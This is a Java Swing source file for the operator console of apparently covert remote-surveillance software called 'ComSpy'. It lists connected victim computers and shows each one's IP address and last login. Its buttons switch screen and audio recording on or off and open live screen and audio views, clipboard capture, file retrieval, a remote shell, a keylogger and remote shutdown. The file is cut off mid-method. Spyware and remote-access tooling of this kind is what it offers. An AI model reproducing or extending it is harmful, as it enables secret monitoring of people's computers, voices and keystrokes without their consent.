/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ui_server;

import Comman.ConnectionServer;
import Comman.KeysVer;
import static Comman.KeysVer.Args;
import Comman.KeysVer.Keys;
import Comman.LOCAL_KEYS;
import Comman.SERVER_KEYS;
import Comman.Tool;
import compy_client.tasks;
import de.javasoft.plaf.synthetica.SyntheticaClassyLookAndFeel;
import java.awt.Toolkit;
import java.text.ParseException;
import java.util.HashMap;
import java.util.ResourceBundle;
import javax.swing.DefaultComboBoxModel;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

/**
 *
 * @author abaza
 */
public final class MainControl extends javax.swing.JFrame {

    SERVER_KEYS Server_Var = new SERVER_KEYS();
    LOCAL_KEYS Local_Var = new LOCAL_KEYS();
    private static final String OS = System.getProperty("os.name").toLowerCase();
    private static final Comman.Tool Tool = new Tool();
    public static ResourceBundle local = Tool.GetLocal();
    public static compy_client.tasks TaskThread = new tasks();
    private Comman.ConnectionServer Server = null;
    String AppName = "ComSpy version 1.0.0 ";
    String CurrentUUID = "", CurrentComputerName = "";
    private Thread ScanComputer = null;
    boolean ScreenShot = false, GIF = false, Audio = false, Keybord = false, CLIPBORD = false,
            AudioLive = false, ScrLive = false, Commands = false, AudioFilesDownload = false, VideoFilesDownload = false;

    /**
     * Creates new form MainControl
     */
    public MainControl() {
        initComponents();
        HideMenus();
        jXBusyLabel1.setVisible(false);
        pnShut.setVisible(false);
        ButoonStatus(false);
        Toolkit tk = Toolkit.getDefaultToolkit();
        int xSize = ((int) tk.getScreenSize().getWidth());
        int ySize = ((int) tk.getScreenSize().getHeight());
        this.setSize(xSize, ySize);
        this.setFocusableWindowState(true);
        this.setExtendedState(MainControl.MAXIMIZED_BOTH);
        this.setTitle(AppName);
        Server = new ConnectionServer();
        jXBusyLabel1.setBusy(true);
        jXBusyLabel1.setText(local.getString("lblScan"));
        jXBusyLabel1.setVisible(true);
        
        WhoConnectedNow();
    }

    private void HideMenus() {
        panelMenu1.setVisible(false);
        pnShut.setVisible(false);
    }

    public void Insert(javax.swing.JInternalFrame Form, String Tital) {
        int x = (int) ((desktopPane.getWidth() - Form.getWidth()) / 2);
        int y = (int) ((desktopPane.getHeight() - Form.getHeight()) / 2);

        desktopPane.add(Form);
        Form.setLocation(x, y);
        Form.setTitle(Tital);
        Form.setVisible(true);
        HideMenus();
    }

    public void WhoConnectedNow() {
        ScanComputer = new Thread(new Runnable() {

            @Override
            public void run() {
                DefaultComboBoxModel CBM = new DefaultComboBoxModel();
                String[][] Data = null;
                Data = new String[][]{
                    {Server_Var.TYPE_COMMENT, Server_Var.GETS_USERS},
                    {Local_Var.SERVER_SUUID, Args.get(Keys.CUUID)}
                };
                jXBusyLabel1.setText(local.getString("lblScan"));
                HashMap<String, String> Ret = Server.Contaner(Data);
                if ((Ret != null) && Server.DoneOrNot(Ret)) {
                    for (int i = 0; i <= Ret.size() - 1; i++) {
                        String reternData = Ret.get(String.valueOf(i));
                        if (reternData != null) {
                            KeysVer.ComputersName.put(i, reternData);
                        }
                    }
                    int ComputerCount = KeysVer.ComputersName.size();
                    if (ComputerCount > 0) {
                        jXBusyLabel1.setBusy(false);
                        jXBusyLabel1.setVisible(false);
                        jComboBox1.setEnabled(true);
                        ButoonStatus(true);
                        for (int i = 0; i <= ComputerCount - 1; i++) {
                            CBM.addElement(KeysVer.ComputersName.get(i));
                        }
                        jComboBox1.removeAll();
                        jComboBox1.setModel(CBM);
                        if (CBM.getSize() > 0) {
                            jComboBox1.setSelectedIndex(0);
                        }
                    } else {
                        jComboBox1.setEnabled(false);
                        ButoonStatus(false);
                    }
                } else {
                    jXBusyLabel1.setText(local.getString("lblScanNotfind"));
                }
            }
        });
        ScanComputer.start();
    }

    private void ButoonStatus(boolean Status) {
        jButton8.setEnabled(Status);
        jButton11.setEnabled(Status);
        jButton1.setEnabled(Status);
        jButton5.setEnabled(Status);
        jToggleButton1.setEnabled(Status);
        jToggleButton2.setEnabled(Status);
        jButton3.setEnabled(Status);
        jButton4.setEnabled(Status);
        jButton6.setEnabled(Status);
        jButton7.setEnabled(Status);
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        desktopPane = new javax.swing.JDesktopPane();
        pnShut = new javax.swing.JPanel();
        jButton9 = new javax.swing.JButton();
        jButton10 = new javax.swing.JButton();
        panelMenu1 = new javax.swing.JPanel();
        jButton12 = new javax.swing.JButton();
        jButton13 = new javax.swing.JButton();
        toolbar = new javax.swing.JPanel();
        jButton2 = new javax.swing.JButton();
        logomin = new javax.swing.JLabel();
        jComboBox1 = new javax.swing.JComboBox();
        jLabel1 = new javax.swing.JLabel();
        jButton8 = new javax.swing.JButton();
        jPanel1 = new javax.swing.JPanel();
        lblComputerName = new javax.swing.JLabel();
        lblLoginDate = new javax.swing.JLabel();
        lblLoginTime = new javax.swing.JLabel();
        lblComputerIP = new javax.swing.JLabel();
        jPanel2 = new javax.swing.JPanel();
        jButton1 = new javax.swing.JButton();
        jButton11 = new javax.swing.JButton();
        jButton5 = new javax.swing.JButton();
        jToggleButton1 = new javax.swing.JToggleButton();
        jToggleButton2 = new javax.swing.JToggleButton();
        jButton3 = new javax.swing.JButton();
        jButton4 = new javax.swing.JButton();
        jButton6 = new javax.swing.JButton();
        jButton7 = new javax.swing.JButton();
        jXBusyLabel1 = new org.jdesktop.swingx.JXBusyLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });
        addHierarchyBoundsListener(new java.awt.event.HierarchyBoundsListener() {
            public void ancestorMoved(java.awt.event.HierarchyEvent evt) {
            }
            public void ancestorResized(java.awt.event.HierarchyEvent evt) {
                formAncestorResized(evt);
            }
        });

        desktopPane.setBorder(javax.swing.BorderFactory.createEtchedBorder(javax.swing.border.EtchedBorder.RAISED));
        desktopPane.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        desktopPane.addMouseMotionListener(new java.awt.event.MouseMotionAdapter() {
            public void mouseMoved(java.awt.event.MouseEvent evt) {
                desktopPaneMouseMoved(evt);
            }
        });

        pnShut.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true));

        jButton9.setText(local.getString("btnshutdown"));
        jButton9.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton9ActionPerformed(evt);
            }
        });

        jButton10.setText(local.getString("btnRestart"));
        jButton10.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton10ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout pnShutLayout = new javax.swing.GroupLayout(pnShut);
        pnShut.setLayout(pnShutLayout);
        pnShutLayout.setHorizontalGroup(
            pnShutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnShutLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jButton9, javax.swing.GroupLayout.PREFERRED_SIZE, 153, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton10, javax.swing.GroupLayout.PREFERRED_SIZE, 153, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        pnShutLayout.linkSize(javax.swing.SwingConstants.HORIZONTAL, new java.awt.Component[] {jButton10, jButton9});

        pnShutLayout.setVerticalGroup(
            pnShutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnShutLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(pnShutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton9, javax.swing.GroupLayout.PREFERRED_SIZE, 134, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton10, javax.swing.GroupLayout.PREFERRED_SIZE, 134, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        pnShutLayout.linkSize(javax.swing.SwingConstants.VERTICAL, new java.awt.Component[] {jButton10, jButton9});

        desktopPane.add(pnShut);
        pnShut.setBounds(0, 0, 338, 160);

        panelMenu1.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true));

        jButton12.setText(local.getString("btnScrDownload"));
        jButton12.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton12ActionPerformed(evt);
            }
        });

        jButton13.setText(local.getString("btnScrRun"));

        javax.swing.GroupLayout panelMenu1Layout = new javax.swing.GroupLayout(panelMenu1);
        panelMenu1.setLayout(panelMenu1Layout);
        panelMenu1Layout.setHorizontalGroup(
            panelMenu1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(panelMenu1Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jButton12, javax.swing.GroupLayout.PREFERRED_SIZE, 154, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton13, javax.swing.GroupLayout.DEFAULT_SIZE, 154, Short.MAX_VALUE)
                .addContainerGap())
        );
        panelMenu1Layout.setVerticalGroup(
            panelMenu1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(panelMenu1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(panelMenu1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jButton12, javax.swing.GroupLayout.DEFAULT_SIZE, 104, Short.MAX_VALUE)
                    .addComponent(jButton13, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );

        desktopPane.add(panelMenu1);
        panelMenu1.setBounds(0, 160, 340, 130);

        jButton2.setText(local.getString("btnExit"));
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        logomin.setToolTipText("");

        jComboBox1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jComboBox1ActionPerformed(evt);
            }
        });

        jLabel1.setText(local.getString("btnGetConnection"));

        jButton8.setText(local.getString("lblShutdownMod"));
        jButton8.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton8ActionPerformed(evt);
            }
        });

        jPanel1.setBorder(javax.swing.BorderFactory.createTitledBorder(""));

        lblComputerName.setText(".....................................................");

        lblLoginDate.setText("00\\00\\0000");

        lblLoginTime.setText("00:00:00 AM");

        lblComputerIP.setText("255.255.255.255");

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(lblComputerName)
                    .addComponent(lblLoginDate)
                    .addComponent(lblLoginTime)
                    .addComponent(lblComputerIP))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(lblComputerName)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(lblLoginDate)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(lblLoginTime)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(lblComputerIP)
                .addContainerGap())
        );

        jPanel2.setBorder(javax.swing.BorderFactory.createTitledBorder(""));

        jButton1.setText(local.getString("btnprtsc"));
        jButton1.setFocusable(false);
        jButton1.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButton1.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton11.setText(local.getString("btnGetFiles"));
        jButton11.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton11ActionPerformed(evt);
            }
        });

        jButton5.setText(local.getString("btnScreenLife"));
        jButton5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton5ActionPerformed(evt);
            }
        });

        jToggleButton1.setText(local.getString("btnGetScreen"));
        jToggleButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jToggleButton1ActionPerformed(evt);
            }
        });

        jToggleButton2.setText(local.getString("btnAudioRec"));
        jToggleButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jToggleButton2ActionPerformed(evt);
            }
        });

        jButton3.setText(local.getString("btnAudioLife"));
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jButton4.setText(local.getString("btnKeybord"));
        jButton4.setEnabled(false);

        jButton6.setText(local.getString("btnClipbord"));
        jButton6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton6ActionPerformed(evt);
            }
        });

        jButton7.setText(local.getString("btnShell"));
        jButton7.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton7ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
            .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(jPanel2Layout.createSequentialGroup()
                    .addContainerGap()
                    .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jButton11, javax.swing.GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE)
                        .addComponent(jButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton5, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jToggleButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jToggleButton2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton6, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton7, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addContainerGap()))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 549, Short.MAX_VALUE)
            .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(jPanel2Layout.createSequentialGroup()
                    .addContainerGap()
                    .addComponent(jButton11, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(jButton5, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(jToggleButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(18, 18, 18)
                    .addComponent(jToggleButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(jButton3, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(18, 18, 18)
                    .addComponent(jButton4, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(jButton6, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(18, 18, 18)
                    .addComponent(jButton7, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
        );

        jXBusyLabel1.setForeground(new java.awt.Color(255, 0, 0));
        jXBusyLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jXBusyLabel1.setText("Scaning");
        jXBusyLabel1.setFont(new java.awt.Font("Dialog", 1, 14)); // NOI18N
        jXBusyLabel1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jXBusyLabel1MouseClicked(evt);
            }
        });

        javax.swing.GroupLayout toolbarLayout = new javax.swing.GroupLayout(toolbar);
        toolbar.setLayout(toolbarLayout);
        toolbarLayout.setHorizontalGroup(
            toolbarLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(toolbarLayout.createSequentialGroup()
                .addGap(1, 1, 1)
                .addGroup(toolbarLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(toolbarLayout.createSequentialGroup()
                        .addComponent(jLabel1)
                        .addGap(210, 212, Short.MAX_VALUE))
                    .addGroup(toolbarLayout.createSequentialGroup()
                        .addComponent(logomin, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addContainerGap())
                    .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
            .addComponent(jButton2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .addGroup(toolbarLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(toolbarLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(toolbarLayout.createSequentialGroup()
                        .addComponent(jComboBox1, 0, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton8, javax.swing.GroupLayout.PREFERRED_SIZE, 72, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jXBusyLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        toolbarLayout.setVerticalGroup(
            toolbarLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, toolbarLayout.createSequentialGroup()
                .addComponent(logomin)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(toolbarLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jComboBox1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton8))
                .addGap(12, 12, 12)
                .addComponent(jXBusyLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(30, 30, 30)
                .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addComponent(toolbar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(desktopPane, javax.swing.GroupLayout.DEFAULT_SIZE, 886, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(desktopPane, javax.swing.GroupLayout.DEFAULT_SIZE, 827, Short.MAX_VALUE)
            .addComponent(toolbar, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        jButton2ActionPerformed(null);
    }//GEN-LAST:event_formWindowClosing

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        if (panelMenu1.isVisible()) {
            panelMenu1.setVisible(false);
        } else {
            panelMenu1.setVisible(true);
        }
    }//GEN-LAST:event_jButton1ActionPerformed

    private void formAncestorResized(java.awt.event.HierarchyEvent evt) {//GEN-FIRST:event_formAncestorResized
    }//GEN-LAST:event_formAncestorResized

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        if (TaskThread != null) {
            TaskThread.Stop();
            TaskThread = null;
        }
        if (Server != null) {
            Server = null;
        }
        System.exit(0);
    }//GEN-LAST:event_jButton2ActionPerformed

    private void jButton5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton5ActionPerformed
        jToggleButton1.setEnabled(false);
        screen_monitor ScreenMonitorLife = new screen_monitor(lblComputerIP.getText(), CurrentUUID, this);
        this.Insert(ScreenMonitorLife, local.getString("btnScreenLife") + " : " + CurrentComputerName);
    }//GEN-LAST:event_jButton5ActionPerformed

    private void jComboBox1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jComboBox1ActionPerformed
        String Item = jComboBox1.getSelectedItem().toString();
        String ID = Item.split(" - ")[0];
        String Name = Item.split(" - ")[1];
        lblComputerName.setText(Name);
        jComboBox1.setEnabled(false);

        String[][] Command = {
            {Server_Var.TYPE_COMMENT, Server_Var.GET_COMPUTER},
            {Local_Var.USERS_SUUID, Args.get(Keys.SUUID)},
            {Local_Var.USERS_COM_NAME, Name},
            {Local_Var.USERS_ID, ID}
        };
        if (Server.Connect(Server_Var.CONNECT, false)) {
            HashMap<String, String> Ret = Server.Contaner(Command);
            if (Server.DoneOrNot(Ret)) {
                lblLoginDate.setText(Ret.get(Local_Var.USERS_LAST_LOG));
                lblLoginTime.setText(Ret.get(Local_Var.USERS_LAST_LOG_TIME));
                lblComputerIP.setText(Ret.get(Local_Var.USERS_IP));
                CurrentUUID = Ret.get(Local_Var.USERS_CUUID);
                CurrentComputerName = Ret.get(Local_Var.USERS_COM_NAME);

                this.setTitle(AppName + " - Select Computer : " + CurrentComputerName + " : " + CurrentUUID);
            }
            HashMap<String, String> Task = new HashMap<>();
            String[][] Data = {{Server_Var.TYPE_COMMENT, Server_Var.TASKS}, {Local_Var.TASKS_CUUID, CurrentUUID}, {Local_Var.TASKS_SUUID, Args.get(Keys.SUUID)}};
            Task = Server.Contaner(Data);
            if (Server.DoneOrNot(Task)) {
//                ScreenShot = ((Integer.parseInt(Task.get(Local_Var.TASKS_SCR))) == 1);
                GIF = ((Integer.parseInt(Task.get(Local_Var.TASKS_GIFREC))) == 1);
                jToggleButton1.setSelected(GIF);
                Audio = ((Integer.parseInt(Task.get(Local_Var.TASKS_AUD))) == 1);
                jToggleButton2.setSelected(Audio);
//                AudioLive = ((Integer.parseInt(Task.get(Local_Var.TASKS_AUD_LIVE))) == 1);
//                ScrLive = ((Integer.parseInt(Task.get(Local_Var.TASKS_SCR_LIFE))) == 1);
//                Keybord = ((Integer.parseInt(Task.get(Local_Var.TASKS_KEYBORD))) == 1);
//                CLIPBORD = ((Integer.parseInt(Task.get(Local_Var.TASKS_CLIPBORD))) == 1);
//                Commands = ((Integer.parseInt(Task.get(Local_Var.TASKS_COMMAND))) == 1);
//                AudioFilesDownload = ((Integer.parseInt(Task.get(Local_Var.TASKS_GET_ALL_AUDIO))) == 1);
//                VideoFilesDownload = ((Integer.parseInt(Task.get(Local_Var.TASKS_GET_ALL_VIDEO))) == 1);
            }
        }
        jComboBox1.setEnabled(true);


    }//GEN-LAST:event_jComboBox1ActionPerformed

    private void jToggleButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jToggleButton1ActionPerformed
        String[][] Data = null;
        if (jToggleButton1.isSelected()) {
            jButton5.setEnabled(false);
            Data = new String[][]{
                {Server_Var.TYPE_COMMENT, Server_Var.GIF_PRINT},
                {Local_Var.TASKS_CUUID, CurrentUUID},
                {Local_Var.TASKS_GIFREC, "1"}
            };
        } else {
            jButton5.setEnabled(true);
            Data = new String[][]{
                {Server_Var.TYPE_COMMENT, Server_Var.GIF_PRINT},
                {Local_Var.TASKS_CUUID, CurrentUUID},
                {Local_Var.TASKS_GIFREC, "0"}
            };
        }

        if (Server.DoneOrNot(Server.Contaner(Data))) {
            compy_client.ComSpy.MessageLog("Open Screen Record");
        } else {
            compy_client.ComSpy.MessageLog("Error Database in Screen Record");
        }
    }//GEN-LAST:event_jToggleButton1ActionPerformed

    private void jToggleButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jToggleButton2ActionPerformed
        String[][] Data = null;
        if (jToggleButton2.isSelected()) {
            jButton3.setEnabled(false);
            Data = new String[][]{
                {Server_Var.TYPE_COMMENT, Server_Var.SOUND_RECORD},
                {Local_Var.TASKS_CUUID, CurrentUUID},
                {Local_Var.TASKS_AUD, "1"}
            };
        } else {
            jButton3.setEnabled(true);
            Data = new String[][]{
                {Server_Var.TYPE_COMMENT, Server_Var.SOUND_RECORD},
                {Local_Var.TASKS_CUUID, CurrentUUID},
                {Local_Var.TASKS_AUD, "0"}
            };
        }

        if (Server.DoneOrNot(Server.Contaner(Data))) {
            compy_client.ComSpy.MessageLog("Open Sound Record");
        } else {
            compy_client.ComSpy.MessageLog("Error Database in Screen Record");
        }

    }//GEN-LAST:event_jToggleButton2ActionPerformed

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        frmSoundSpicker FSS = new frmSoundSpicker(CurrentUUID, CurrentComputerName, this);
        this.Insert(FSS, local.getString("btnAudioLife") + " : " + CurrentComputerName);
    }//GEN-LAST:event_jButton3ActionPerformed

    private void jButton6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton6ActionPerformed
        frmClipbord Clip = new frmClipbord(CurrentUUID);
        this.Insert(Clip, local.getString("btnClipbord") + " : " + CurrentComputerName);
